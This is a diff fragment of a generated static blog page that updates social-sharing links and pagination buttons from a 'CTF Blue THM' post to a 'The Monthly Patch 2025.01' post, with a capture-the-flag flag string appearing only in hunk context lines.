     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
     </div>
@@ -407,7 +343,7 @@ flag{admin_documents_can_be_valuable}
 </a>
 
 
-<a class="resp-sharing-button__link" href="whatsapp://send?text=CTF%20Blue%20THM%20http%3a%2f%2flocalhost%3a1313%2fposts%2f2024%2f07%2fctf-blue-thm%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+<a class="resp-sharing-button__link" href="whatsapp://send?text=The%20Monthly%20Patch%202025.01%20http%3a%2f%2flocalhost%3a1313%2fposts%2f2025%2f01%2fthe-monthly-patch-2025.01%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
   <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
     </div>
@@ -415,7 +351,7 @@ flag{admin_documents_can_be_valuable}
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=http%3a%2f%2flocalhost%3a1313%2fposts%2f2024%2f07%2fctf-blue-thm%2f&amp;t=CTF%20Blue%20THM" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=http%3a%2f%2flocalhost%3a1313%2fposts%2f2025%2f01%2fthe-monthly-patch-2025.01%2f&amp;t=The%20Monthly%20Patch%202025.01" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
   <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
 			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
     </div>
@@ -423,7 +359,7 @@ flag{admin_documents_can_be_valuable}
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=CTF%20Blue%20THM&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2f2024%2f07%2fctf-blue-thm%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=The%20Monthly%20Patch%202025.01&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2f2025%2f01%2fthe-monthly-patch-2025.01%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
   <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
       <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
     </div>
@@ -438,18 +374,11 @@ flag{admin_documents_can_be_valuable}
 
         <div class="pagination__buttons">
             
-            <span class="button previous">
-                <a href="http://localhost:1313/posts/2025/01/the-monthly-patch-2025.01/">
-                    <span class="button__icon">←</span>
-                    <span class="button__text">The Monthly Patch 2025.01</span>
-                </a>
-            </span>
-            
 
             
             <span class="button next">
-                <a href="http://localhost:1313/posts/2024/07/hello-world./">
-                    <span class="button__text">Hello World.</span>
+                <a href="http://localhost:1313/posts/2024/07/ctf-blue-thm/">
+                    <span class="button__text">CTF Blue THM</span>
                     <span class="button__icon">→</span>
                 </a>
             </span>
